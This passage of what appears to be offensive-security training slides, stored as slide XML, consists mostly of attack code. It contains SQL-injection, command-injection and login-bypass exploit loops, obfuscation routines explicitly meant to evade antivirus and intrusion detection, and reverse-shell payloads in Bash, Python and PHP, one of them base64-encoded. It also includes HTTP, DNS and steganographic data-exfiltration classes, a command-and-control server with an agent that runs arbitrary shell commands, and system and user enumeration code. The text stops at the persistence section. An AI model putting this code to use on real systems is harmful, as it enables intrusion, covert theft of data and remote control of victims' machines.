              <a:t>for payload in payloads:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>url = f"{self.target}?{self.parameter}={</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>payload}"</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response = self.client.get(url)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Check for error patterns</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if self._is_vulnerable(response):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return ExploitResult(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>success=True,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>vulnerability_type="SQL Injection",</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>payload=payload,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response=response.text</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return ExploitResult(success=False)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3.2.3  Command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COMMAND INJECTION</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>class CommandInjectionExploit(Exploit):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def exploit(self):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>payloads = [</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"; ls",</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"| whoami",</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"|| id",</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"&amp;&amp; cat /etc/passwd"</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for payload in payloads:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>url = f"{self.target}?{self.parameter}={</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>urllib.parse.quote(payload)}"</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response = self.client.get(url)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Check for command output</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if self._is_vulnerable(response):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return ExploitResult(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>success=True,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>vulnerability_type="Command Injection",</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>payload=payload,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>output=response.text</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return ExploitResult(success=False)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3.2.4  Authentication Bypass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1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AUTHENTICATION BYPASS</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>class AuthenticationBypassExploit(Exploit):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def exploit(self):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>username_payloads = [</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"admin",</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"' OR '1'='1",</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"admin'--",</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"admin' OR 1=1--"</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>password_payloads = [</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"password",</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"' OR '1'='1",</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"anything"</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for username in username_payloads:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for password in password_payloads:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>data = {</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'username': username,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'password': password</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response = self.client.post(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.target, data=data</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if response.status_code in [200, 302]:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if 'login' not in response.url:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return ExploitResult(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>success=True</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return ExploitResult(success=False)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3.3.1  Obfuscation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OBFUSCATION CONCEPT</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Like speaking in code to avoid eavesdroppers:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Original = "Meet me at midnight"</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Obfuscated = "M33t m3 @ m1dn1ght"</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Why we obfuscate:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• AV Evasion - Signature detection</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• IDS/IPS Bypass - Pattern matching</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Filter Bypass - Input filters</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Stealth - Hide true purpose</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Common techniques:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Encoding (Base64, Hex)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Encryption (XOR, Caesar)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Compression (zlib)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Multiple layers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3.3.2  Encoding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ENCODING METHODS</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>import base64, binascii</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Base64</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def encode_base64(data):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return base64.b64encode(data.encode()).decode()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Example: whoami → d2hvYW1p</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Hex</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def encode_hex(data):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return binascii.hexlify(data.encode()).decode()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Example: whoami → 77686f616d69</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># XOR</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def encode_xor(data, key):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>data_bytes = data.encode()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>key_bytes = key.encode() * (len(data)//len(key)+1)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>result = bytes([a ^ b for a, b in</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>zip(data_bytes, key_bytes)])</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return binascii.hexlify(result).decode()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Example: whoami XOR secret → 1a2b3c4d5e6f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3.3.3  Multi-Layer Obfuscation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MULTI-LAYER OBFUSCATION</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>class ObfuscationEngine:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def multi_encode(self, data, techniques):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>result = data</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for technique in techniques:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if technique == 'base64':</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>result = self.encode_base64(result)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>elif technique == 'hex':</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>result = self.encode_hex(result)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>elif technique == 'rot13':</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>result = self.encode_rot13(result)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return result</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Example</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>engine = ObfuscationEngine()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>original = "whoami"</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>obfuscated = engine.multi_encode(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>original,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>['rot13', 'base64', 'hex']</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Result:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Original: whoami</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># ROT13: jubnzv</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Base64: anVibnp2</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Hex: 616e5649626e7032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3.3.4  Reverse Shell Payloads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REVERSE SHELL PAYLOADS</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Bash</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>bash_shell = "bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1"</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Python</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>python_shell = """</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>python -c 'import socket,os,pty;</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>s=socket.socket();</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>s.connect((\"192.168.1.100\",4444));</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>os.dup2(s.fileno(),0);</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>os.dup2(s.fileno(),1);</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>os.dup2(s.fileno(),2);</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>pty.spawn(\"/bin/sh\")'</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"""</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># PHP</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>php_shell = """</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>&lt;?php $s=fsockopen("192.168.1.100",4444);</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"); ?&gt;</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>"""</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Obfuscated Base64</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>import base64</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>encoded = base64.b64encode(bash_shell.encode()).decode()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Result: YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==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3.4.1  Exfiltration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EXFILTRATION CHANNELS</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Like a spy stealing documents:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Data = Secret documents</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Channel = How to get them out</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Covert Channel = Hiding in innocent items</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Tunneling = One method carrying another</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Channels we use:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• HTTP - Blends with web traffic</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• DNS - Often allowed through firewalls</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• ICMP - Simple, not commonly logged</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Steganography - Hidden in images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3.4.2  HTTP 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HTTP EXFILTRATION</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>class HTTPExfiltration(ExfiltrationBase):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def _send(self, data):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Encode data</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>encoded = base64.b64encode(data).decode()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Split into chunks</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>chunks = [encoded[i:i+1000] for i in</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>range(0, len(encoded), 1000)]</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for chunk in chunks:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if self.method == 'GET':</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>url = f"{self.url}?{self.param_name}={</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>urllib.parse.quote(chunk)}"</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response = requests.get(url)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>else:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>response = requests.post(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.url,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>data={self.param_name: chunk}</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if response.status_code != 200:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>print(f"Exfil failed: {response.status}")</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>time.sleep(0.1)  # Avoid rate limiting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3.4.3  DNS Exfiltration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DNS EXFILTRATION</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>class DNSExfiltration(ExfiltrationBase):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def _send(self, data):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Encode data</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>encoded = base64.b64encode(data).decode()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>encoded = encoded.replace('=', '')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Split into chunks (max 20 chars per subdomain)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>chunks = [encoded[i:i+20] for i in</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>range(0, len(encoded), 20)]</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for i, chunk in enumerate(chunks):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Create subdomain</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>subdomain = f"{chunk}.{self.domain}"</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>try:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># DNS lookup</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>socket.gethostbyname(subdomain)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>print(f"Exfil chunk {i}: {subdomain}")</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>except socket.gaierror:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Expected - we just want the query</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>pass</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>time.sleep(self.delay)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3.4.4 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STEGANOGRAPHY</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>class SteganographyExfiltration(ExfiltrationBase):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def _send(self, data):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Load image</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>img = Image.open(self.image_path)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>img = img.convert('RGB')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>pixels = img.load()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>width, height = img.size</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Add header with data length</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>header = struct.pack('!I', len(data))</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>data = header + data</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Convert to bits</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>data_bits = []</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for byte in data:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for i in range(7, -1, -1):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>data_bits.append((byte &gt;&gt; i) &amp; 1)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Embed using LSB</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>bit_index = 0</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for y in range(height):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for x in range(width):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if bit_index &gt;= len(data_bits):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>break</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>r, g, b = pixels[x, y]</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>r = (r &amp; 0xFE) | data_bits[bit_index]</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>bit_index +=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4.1.1  C2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C2 ARCHITECTURE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Like a spy agency communication network:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• C2 Server = Headquarters</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Agent = Field spy</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Beacon = Regular check-in</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Task = Mission orders</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Response = Mission results</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>C2 SERVER</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- API endpoints</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- Database</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- Task management</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- Result collection</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>C2 AGENT</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- Registration</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- Task execution</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- Result submission</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>- Beacon/Heartbeat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4.1.2  C2 Server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C2 SERVER CODE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>from flask import Flask, request, jsonify</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>import sqlite3</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>app = Flask(__name__)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>@app.route('/c2/register', methods=['POST'])</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def register():</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>data = request.json</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>agent_id = str(uuid.uuid4())</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Save to database</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>conn = sqlite3.connect('c2.db')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>cursor = conn.cursor()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>cursor.execute(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'INSERT INTO agents VALUES (?, ?, ?, ?, ?)',</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>(agent_id, data['hostname'], data['username'],</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>datetime.now().isoformat(), 'active')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>conn.commit()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>conn.close()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return jsonify({'agent_id': agent_id})</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>@app.route('/c2/tasks/&lt;agent_id&gt;', methods=['GET'])</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def get_tasks(agent_id):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Get pending tasks from database</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>conn = sqlite3.connect('c2.db')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>cursor = conn.cursor()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>tasks = cursor.execute(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'SELECT command, params FROM tasks WHERE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4.1.3  C2 Agent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C2 AGENT CODE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>class C2Agent:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def beacon(self):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Get tasks</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>tasks = self.get_tasks()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for task in tasks:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>result = self.execute_task(task)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>self.submit_result(result)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def execute_task(self, task):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>command = task['command']</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>params = task.get('params', {})</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Built-in commands</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if command == 'whoami':</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return {'output': os.getlogin()}</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>elif command == 'hostname':</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return {'output': socket.gethostname()}</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>elif command == 'system':</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>cmd = params.get('cmd', '')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>output = subprocess.check_output(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>cmd, shell=True, text=True</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>return {'output': output}</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>elif command == 'ls':</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>path = params.get('path', '.')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>output = subprocess.check_output(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>['ls', '-la', path], text=True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4.2.1  Enumeration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ENUMERATION CATEGORIES</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Like a detective gathering evidence:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• System = Building blueprints</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Users = Who lives there</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Processes = What's happening</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Network = How it connects outside</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Services = What's inside</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Categories:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• System - OS, version, architecture</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Users - User list, groups, privileges</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Processes - Running services, connections</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Network - Interfaces, routes, ARP</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Services - Installed services, versions</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Cron/Scheduled - Automated tasks</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Security - Firewall, AV, SELinux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4.2.2  System Info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SYSTEM INFO CODE</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>import platform, psutil, socket</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>class SystemEnumerator:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def get_system_info(self):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>info = SystemInfo()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Basic info</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>info.hostname = socket.gethostname()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>info.os_name = platform.system()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>info.os_version = platform.version()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>info.kernel = platform.release()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>info.arch = platform.machine()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># CPU</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>info.cpu_count = psutil.cpu_count()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Memory</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>mem = psutil.virtual_memory()</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>info.memory_total = mem.total</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>info.memory_available = mem.available</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Disk</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>disk = psutil.disk_usage('/')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>info.disk_usage = {</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'total': disk.total,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'used': disk.used,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'free': disk.free,</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>'percent': disk.percent</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Network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4.2.3  User Enumeration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USER ENUMERATION</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>def get_users(self):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>users = []</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if self.platform == 'Windows':</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Windows users</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>import win32net</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>user_info = win32net.NetUserGetInfo(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>None, win32api.GetUserName(), 2</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>users.append(UserInfo(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>username=user_info['name']</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>))</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>else:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t># Unix/Linux users</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>with open('/etc/passwd', 'r') as f:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>for line in f:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if line.startswith('#'):</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>continue</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>parts = line.strip().split(':')</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>if len(parts) &gt;= 7:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>users.append(UserInfo(</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>username=parts[0],</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>uid=int(parts[2]),</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>gid=int(parts[3]),</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>home=parts[5],</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>shell=parts[6]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4.3.1  Persistence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PERSISTENCE METHODS</a:t>
            </a:r>
            <a:br/>
            <a:r>
